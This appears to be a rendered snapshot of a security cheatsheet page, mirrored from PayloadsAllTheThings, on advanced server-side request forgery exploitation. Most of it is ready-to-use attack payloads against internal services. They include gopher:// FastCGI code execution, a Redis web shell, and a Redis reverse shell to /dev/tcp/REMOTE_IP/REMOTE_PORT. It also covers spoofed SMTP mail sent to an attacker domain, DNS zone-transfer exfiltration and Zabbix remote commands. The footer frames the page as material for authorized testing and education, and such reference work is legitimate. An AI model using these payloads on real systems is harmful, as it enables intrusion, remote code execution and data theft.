@@ -1,0 +1,371 @@
+- generic [active] [ref=f6e1459]:
+  - banner [ref=f6e1460]:
+    - generic [ref=f6e1461]:
+      - link "DÆMON//SEC home" [ref=f6e1462] [cursor=pointer]:
+        - /url: /daemon-sec-cheatsheet/
+        - text: DÆMON
+        - generic [ref=f6e1463]: //
+        - text: SEC
+        - generic [ref=f6e1464]: _
+      - navigation "Primary" [ref=f6e1465]:
+        - link "01 Vault" [ref=f6e1466] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/
+          - generic [ref=f6e1467]: "01"
+          - generic [ref=f6e1468]: Vault
+        - link "02 Payloads" [ref=f6e1469] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads
+          - generic [ref=f6e1470]: "02"
+          - generic [ref=f6e1471]: Payloads
+        - link "03 Tags" [ref=f6e1472] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/tags
+          - generic [ref=f6e1473]: "03"
+          - generic [ref=f6e1474]: Tags
+        - link "04 Credits" [ref=f6e1475] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/credits
+          - generic [ref=f6e1476]: "04"
+          - generic [ref=f6e1477]: Credits
+      - generic [ref=f6e1478]:
+        - button "Search cheatsheets" [ref=f6e1479] [cursor=pointer]:
+          - generic [ref=f6e1482]: Search
+          - generic [ref=f6e1483]: /
+        - button "Toggle theme" [ref=f6e1484] [cursor=pointer]
+        - link "DÆMON main site" [ref=f6e1489] [cursor=pointer]:
+          - /url: https://daemon-404.github.io
+        - link "GitHub repository" [ref=f6e1492] [cursor=pointer]:
+          - /url: https://github.com/DAEMON-404/daemon-sec-cheatsheet
+  - main [ref=f6e1495]:
+    - generic [ref=f6e1496]:
+      - navigation [ref=f6e1497]:
+        - link "~" [ref=f6e1498] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/
+        - generic [ref=f6e1499]: /
+        - link "payloads" [ref=f6e1500] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads
+        - generic [ref=f6e1501]: /
+        - link "server-side-request-forgery" [ref=f6e1502] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/server-side-request-forgery
+        - generic [ref=f6e1503]: /
+        - generic [ref=f6e1504]: ssrf-advanced-exploitation
+      - generic [ref=f6e1505]:
+        - paragraph [ref=f6e1506]: // Payloads · Server Side Request Forgery
+        - heading "SSRF Advanced Exploitation" [level=1] [ref=f6e1507]
+      - complementary "Attribution" [ref=f6e1508]:
+        - generic [ref=f6e1509]: mirror
+        - generic [ref=f6e1510]:
+          - text: Mirrored from
+          - link "PayloadsAllTheThings" [ref=f6e1511] [cursor=pointer]:
+            - /url: https://github.com/swisskyrepo/PayloadsAllTheThings
+          - text: › Server Side Request Forgery
+          - generic [ref=f6e1512]:
+            - text: MIT ·
+            - link "credits" [ref=f6e1513] [cursor=pointer]:
+              - /url: /daemon-sec-cheatsheet/credits
+            - text: ·
+            - code [ref=f6e1514]: 3bff425
+        - link "View source on GitHub" [ref=f6e1515] [cursor=pointer]:
+          - /url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3bff425aca2b/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md
+          - text: source
+      - article [ref=f6e1518]:
+        - blockquote [ref=f6e1519]:
+          - paragraph [ref=f6e1520]: Some services (e.g., Redis, Elasticsearch) allow unauthenticated data writes or command execution when accessed directly. An attacker could exploit SSRF to interact with these services, injecting malicious payloads like web shells or manipulating application state.
+        - heading "Summary" [level=2] [ref=f6e1521]
+        - list [ref=f6e1522]:
+          - listitem [ref=f6e1523]:
+            - link "DNS AXFR" [ref=f6e1524] [cursor=pointer]:
+              - /url: "#dns-axfr"
+          - listitem [ref=f6e1525]:
+            - link "FastCGI" [ref=f6e1526] [cursor=pointer]:
+              - /url: "#fastcgi"
+          - listitem [ref=f6e1527]:
+            - link "Memcached" [ref=f6e1528] [cursor=pointer]:
+              - /url: "#memcached"
+          - listitem [ref=f6e1529]:
+            - link "MySQL" [ref=f6e1530] [cursor=pointer]:
+              - /url: "#memcached"
+          - listitem [ref=f6e1531]:
+            - link "Redis" [ref=f6e1532] [cursor=pointer]:
+              - /url: "#redis"
+          - listitem [ref=f6e1533]:
+            - link "SMTP" [ref=f6e1534] [cursor=pointer]:
+              - /url: "#smtp"
+          - listitem [ref=f6e1535]:
+            - link "WSGI" [ref=f6e1536] [cursor=pointer]:
+              - /url: "#wsgi"
+          - listitem [ref=f6e1537]:
+            - link "Zabbix" [ref=f6e1538] [cursor=pointer]:
+              - /url: "#zabbix"
+          - listitem [ref=f6e1539]:
+            - link "References" [ref=f6e1540] [cursor=pointer]:
+              - /url: "#references"
+        - heading "DNS AXFR" [level=2] [ref=f6e1541]
+        - paragraph [ref=f6e1542]:
+          - generic [ref=f6e1543]: Q
+          - text: uery an internal DNS resolver to trigger a full zone transfer (
+          - strong [ref=f6e1544]: AXFR
+          - text: ) and exfiltrate a list of subdomains.
+        - figure "py Copy" [ref=f6e1545]:
+          - generic [ref=f6e1546]:
+            - generic [ref=f6e1547]: py
+            - button "Copy" [ref=f6e1548] [cursor=pointer]
+          - code [ref=f6e1553]:
+            - generic [ref=f6e1554]: from urllib.parse import quote
+            - generic [ref=f6e1555]: domain,tld = "example.lab".split('.')
+            - generic [ref=f6e1556]: "dns_request = b\"\\x01\\x03\\x03\\x07\" # BITMAP"
+            - generic [ref=f6e1557]: "dns_request += b\"\\x00\\x01\" # QCOUNT"
+            - generic [ref=f6e1558]: "dns_request += b\"\\x00\\x00\" # ANCOUNT"
+            - generic [ref=f6e1559]: "dns_request += b\"\\x00\\x00\" # NSCOUNT"
+            - generic [ref=f6e1560]: "dns_request += b\"\\x00\\x00\" # ARCOUNT"
+            - generic [ref=f6e1561]: "dns_request += len(domain).to_bytes() # LEN DOMAIN"
+            - generic [ref=f6e1562]: "dns_request += domain.encode() # DOMAIN"
+            - generic [ref=f6e1563]: "dns_request += len(tld).to_bytes() # LEN TLD"
+            - generic [ref=f6e1564]: "dns_request += tld.encode() # TLD"
+            - generic [ref=f6e1565]: "dns_request += b\"\\x00\" # DNAME EOF"
+            - generic [ref=f6e1566]: "dns_request += b\"\\x00\\xFC\" # QTYPE AXFR (252)"
+            - generic [ref=f6e1567]: "dns_request += b\"\\x00\\x01\" # QCLASS IN (1)"
+            - generic [ref=f6e1568]: dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request
+            - generic [ref=f6e1569]: "print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')"
+        - paragraph [ref=f6e1570]:
+          - text: Example of payload for
+          - code [ref=f6e1571]: example.lab
+          - text: ":"
+          - code [ref=f6e1572]: gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01
+        - figure "ps1 Copy" [ref=f6e1573]:
+          - generic [ref=f6e1574]:
+            - generic [ref=f6e1575]: ps1
+            - button "Copy" [ref=f6e1576] [cursor=pointer]
+          - code [ref=f6e1581]:
+            - generic [ref=f6e1582]: curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd
+        - heading "FastCGI" [level=2] [ref=f6e1583]
+        - paragraph [ref=f6e1584]:
+          - text: Requires to know the full path of one PHP file on the server, by default the exploit is using
+          - code [ref=f6e1585]: /usr/share/php/PEAR.php
+          - text: .
+        - figure "ps1 Copy" [ref=f6e1586]:
+          - generic [ref=f6e1587]:
+            - generic [ref=f6e1588]: ps1
+            - button "Copy" [ref=f6e1589] [cursor=pointer]
+          - code [ref=f6e1594]:
+            - generic [ref=f6e1595]: gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00
+        - heading "Memcached" [level=2] [ref=f6e1596]
+        - paragraph [ref=f6e1597]: Memcached communicates over port 11211 by default. While it is primarily used for storing serialized data to enhance application performance, vulnerabilities can arise during the deserialization of this data.
+        - figure "ps1 Copy" [ref=f6e1598]:
+          - generic [ref=f6e1599]:
+            - generic [ref=f6e1600]: ps1
+            - button "Copy" [ref=f6e1601] [cursor=pointer]
+          - code [ref=f6e1606]:
+            - generic [ref=f6e1607]: python2.7 ./gopherus.py --exploit pymemcache
+            - generic [ref=f6e1608]: python2.7 ./gopherus.py --exploit rbmemcache
+            - generic [ref=f6e1609]: python2.7 ./gopherus.py --exploit phpmemcache
+            - generic [ref=f6e1610]: python2.7 ./gopherus.py --exploit dmpmemcache
+        - heading "MySQL" [level=2] [ref=f6e1611]
+        - paragraph [ref=f6e1612]: MySQL user should not be password protected.
+        - figure "ps1 Copy" [ref=f6e1613]:
+          - generic [ref=f6e1614]:
+            - generic [ref=f6e1615]: ps1
+            - button "Copy" [ref=f6e1616] [cursor=pointer]
+          - code [ref=f6e1621]:
+            - generic [ref=f6e1622]: $ python2.7 ./gopherus.py --exploit mysql
+            - generic [ref=f6e1623]: "Give MySQL username: root"
+            - generic [ref=f6e1624]: "Give query to execute: SELECT 123;"
+            - generic [ref=f6e1625]: gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01
+        - heading "Redis" [level=2] [ref=f6e1626]
+        - blockquote [ref=f6e1627]:
+          - paragraph [ref=f6e1628]: Redis is a database system that stores everything in RAM
+        - paragraph [ref=f6e1629]:
+          - text: The attacker changes Redis’s dump directory to the web server’s document root (
+          - code [ref=f6e1630]: /var/www/html
+          - text: ) and renames the dump file to
+          - code [ref=f6e1631]: file.php
+          - text: ", ensuring that when the database is saved, it generates a PHP file. They then create a Redis key ("
+          - code [ref=f6e1632]: mykey
+          - text: ) containing the web shell code, which enables remote command execution via HTTP GET parameters. Finally, the
+          - code [ref=f6e1633]: SAVE
+          - text: command forces Redis to write the current in-memory database to disk, resulting in the creation of the malicious web shell at
+          - code [ref=f6e1634]: /var/www/html/file.php
+          - text: .
+        - figure "ps1 Copy" [ref=f6e1635]:
+          - generic [ref=f6e1636]:
+            - generic [ref=f6e1637]: ps1
+            - button "Copy" [ref=f6e1638] [cursor=pointer]
+          - code [ref=f6e1643]:
+            - generic [ref=f6e1644]: CONFIG SET dir /var/www/html
+            - generic [ref=f6e1645]: CONFIG SET dbfilename file.php
+            - generic [ref=f6e1646]: SET mykey "<?php system($_GET[0])?>"
+            - generic [ref=f6e1647]: SAVE
+        - list [ref=f6e1648]:
+          - listitem [ref=f6e1649]:
+            - paragraph [ref=f6e1650]:
+              - text: Getting a webshell with
+              - code [ref=f6e1651]: dict://
+            - figure "powershell Copy" [ref=f6e1652]:
+              - generic [ref=f6e1653]:
+                - generic [ref=f6e1654]: powershell
+                - button "Copy" [ref=f6e1655] [cursor=pointer]
+              - code [ref=f6e1660]:
+                - generic [ref=f6e1661]: dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+                - generic [ref=f6e1662]: dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+                - generic [ref=f6e1663]: dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+                - generic [ref=f6e1664]: dict://127.0.0.1:6379/SAVE
+          - listitem [ref=f6e1665]:
+            - paragraph [ref=f6e1666]:
+              - text: Getting a PHP reverse shell with
+              - code [ref=f6e1667]: gopher://
+            - figure "powershell Copy" [ref=f6e1668]:
+              - generic [ref=f6e1669]:
+                - generic [ref=f6e1670]: powershell
+                - button "Copy" [ref=f6e1671] [cursor=pointer]
+              - code [ref=f6e1676]:
+                - generic [ref=f6e1677]: gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+                - generic [ref=f6e1678]: gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+                - generic [ref=f6e1679]: gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+                - generic [ref=f6e1680]: gopher://127.0.0.1:6379/_save
+        - heading "SMTP" [level=2] [ref=f6e1681]
+        - paragraph [ref=f6e1682]:
+          - text: Malicious actors can craft
+          - code [ref=f6e1683]: gopher://
+          - text: URLs to manipulate low-level protocols (like HTTP or SMTP) on internal systems.
+        - figure "ps1 Copy" [ref=f6e1684]:
+          - generic [ref=f6e1685]:
+            - generic [ref=f6e1686]: ps1
+            - button "Copy" [ref=f6e1687] [cursor=pointer]
+          - code [ref=f6e1692]:
+            - generic [ref=f6e1693]: gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
+        - paragraph [ref=f6e1694]:
+          - text: The following PHP script can be used to generate a page that will redirect to the
+          - code [ref=f6e1695]: gopher://
+          - text: payload.
+        - figure "php Copy" [ref=f6e1696]:
+          - generic [ref=f6e1697]:
+            - generic [ref=f6e1698]: php
+            - button "Copy" [ref=f6e1699] [cursor=pointer]
+          - code [ref=f6e1704]:
+            - generic [ref=f6e1705]: <?php
+            - generic [ref=f6e1706]: $commands = array(
+            - generic [ref=f6e1707]: "'HELO victim.com',"
+            - generic [ref=f6e1708]: "'MAIL FROM: <admin@victim.com>',"
+            - generic [ref=f6e1709]: "'RCPT To: <User@[ATTACKER.DOMAIN.TLD]>',"
+            - generic [ref=f6e1710]: "'DATA',"
+            - generic [ref=f6e1711]: "'Subject: @hacker!',"
+            - generic [ref=f6e1712]: "'Hello Friend',"
+            - generic [ref=f6e1713]: "'.'"
+            - generic [ref=f6e1714]: );
+            - generic [ref=f6e1715]: $payload = implode('%0A', $commands);
+            - generic [ref=f6e1716]: "header('Location: gopher://0:25/_'.$payload);"
+            - generic [ref=f6e1717]: "?>"
+        - heading "WSGI" [level=2] [ref=f6e1718]
+        - paragraph [ref=f6e1719]:
+          - text: Exploit using the Gopher protocol, full exploit script available at
+          - link "wofeiwo/webcgi-exploits/uwsgi_exp.py" [ref=f6e1720] [cursor=pointer]:
+            - /url: https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py
+          - text: .
+        - figure "powershell Copy" [ref=f6e1721]:
+          - generic [ref=f6e1722]:
+            - generic [ref=f6e1723]: powershell
+            - button "Copy" [ref=f6e1724] [cursor=pointer]
+          - code [ref=f6e1729]:
+            - generic [ref=f6e1730]: gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+        - table [ref=f6e1732]:
+          - rowgroup [ref=f6e1733]:
+            - row [ref=f6e1734]:
+              - columnheader "Header" [ref=f6e1735]
+              - columnheader [ref=f6e1736]
+              - columnheader [ref=f6e1737]
+          - rowgroup [ref=f6e1738]:
+            - row [ref=f6e1739]:
+              - cell "modifier1" [ref=f6e1740]
+              - cell "(1 byte)" [ref=f6e1741]
+              - cell "0 (%00)" [ref=f6e1742]
+            - row [ref=f6e1743]:
+              - cell "datasize" [ref=f6e1744]
+              - cell "(2 bytes)" [ref=f6e1745]
+              - cell "26 (%1A%00)" [ref=f6e1746]
+            - row [ref=f6e1747]:
+              - cell "modifier2" [ref=f6e1748]
+              - cell "(1 byte)" [ref=f6e1749]
+              - cell "0 (%00)" [ref=f6e1750]
+        - table [ref=f6e1752]:
+          - rowgroup [ref=f6e1753]:
+            - row [ref=f6e1754]:
+              - columnheader "Variable (UWSGI_FILE)" [ref=f6e1755]
+              - columnheader [ref=f6e1756]
+              - columnheader [ref=f6e1757]
+              - columnheader [ref=f6e1758]
+          - rowgroup [ref=f6e1759]:
+            - row [ref=f6e1760]:
+              - cell "key length" [ref=f6e1761]
+              - cell "(2 bytes)" [ref=f6e1762]
+              - cell "10" [ref=f6e1763]
+              - cell "(%0A%00)" [ref=f6e1764]
+            - row [ref=f6e1765]:
+              - cell "key data" [ref=f6e1766]
+              - cell "(m bytes)" [ref=f6e1767]
+              - cell [ref=f6e1768]
+              - cell "UWSGI_FILE" [ref=f6e1769]
+            - row [ref=f6e1770]:
+              - cell "value length" [ref=f6e1771]
+              - cell "(2 bytes)" [ref=f6e1772]
+              - cell "12" [ref=f6e1773]
+              - cell "(%0C%00)" [ref=f6e1774]
+            - row [ref=f6e1775]:
+              - cell "value data" [ref=f6e1776]
+              - cell "(n bytes)" [ref=f6e1777]
+              - cell [ref=f6e1778]
+              - cell "/tmp/test.py" [ref=f6e1779]
+        - heading "Zabbix" [level=2] [ref=f6e1780]
+        - paragraph [ref=f6e1781]:
+          - text: If
+          - code [ref=f6e1782]: EnableRemoteCommands=1
+          - text: is enabled in the Zabbix Agent configuration, it allows the execution of remote commands.
+        - figure "ps1 Copy" [ref=f6e1783]:
+          - generic [ref=f6e1784]:
+            - generic [ref=f6e1785]: ps1
+            - button "Copy" [ref=f6e1786] [cursor=pointer]
+          - code [ref=f6e1791]:
+            - generic [ref=f6e1792]: gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
+        - heading "References" [level=2] [ref=f6e1793]
+        - list [ref=f6e1794]:
+          - listitem [ref=f6e1795]:
+            - link "SSRFmap - Introducing the AXFR Module - Swissky - June 13, 2024" [ref=f6e1796] [cursor=pointer]:
+              - /url: https://web.archive.org/web/20240614121446/https://swisskyrepo.github.io/SSRFmap-axfr/
+          - listitem [ref=f6e1797]:
+            - link "How I Converted SSRF to XSS in Jira - Ashish Kunwar - June 1, 2018" [ref=f6e1798] [cursor=pointer]:
+              - /url: https://web.archive.org/web/20251116223629/https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158
+          - listitem [ref=f6e1799]:
+            - link "Pong [EN] | FCSC 2024 - Arthur Deloffre (@Vozec1) - April 12, 2024" [ref=f6e1800] [cursor=pointer]:
+              - /url: https://vozec.fr/writeups/pong-fcsc2024-en/
+          - listitem [ref=f6e1801]:
+            - link "Pong [EN] | FCSC 2024 - Kévin - Mizu (@kevin_mizu) - April 13, 2024" [ref=f6e1802] [cursor=pointer]:
+              - /url: https://mizu.re/post/pong
+      - navigation "Pagination" [ref=f6e1803]:
+        - link [ref=f6e1804] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/server-side-request-forgery
+          - text: ← Prev
+          - strong [ref=f6e1805]: Server-Side Request Forgery
+        - link [ref=f6e1806] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/payloads/server-side-request-forgery/ssrf-cloud-instances
+          - text: Next →
+          - strong [ref=f6e1807]: SSRF URL for Cloud Instances
+  - contentinfo [ref=f6e1808]:
+    - generic [ref=f6e1809]:
+      - generic [ref=f6e1810]:
+        - link "DÆMON // SEC" [ref=f6e1811] [cursor=pointer]:
+          - /url: /daemon-sec-cheatsheet/
+          - text: DÆMON
+          - generic [ref=f6e1812]: //
+          - text: SEC
+        - paragraph [ref=f6e1813]: A curated vault of IT & security cheatsheets. For authorized testing, CTFs, and education only. Know your scope; get permission first.
+      - generic [ref=f6e1814]:
+        - link "daemon-404.github.io ↗" [ref=f6e1815] [cursor=pointer]:
+          - /url: https://daemon-404.github.io
+        - link "github / daemon-sec-cheatsheet ↗" [ref=f6e1816] [cursor=pointer]:
+          - /url: https://github.com/DAEMON-404/daemon-sec-cheatsheet
+        - generic [ref=f6e1817]:
+          - text: Payloads mirrored from
+          - link "PayloadsAllTheThings" [ref=f6e1818] [cursor=pointer]:
+            - /url: https://github.com/swisskyrepo/PayloadsAllTheThings
+          - text: (MIT) ·
+          - link "credits" [ref=f6e1819] [cursor=pointer]:
+            - /url: /daemon-sec-cheatsheet/credits
+        - generic [ref=f6e1820]: © 2026 DÆMON//SEC · MIT
+        - generic [ref=f6e1821]: Rosé Pine · Astro · Pagefind
+  - generic [ref=f6e1822]: SSRF Advanced Exploitation — Payloads — DÆMON//SEC
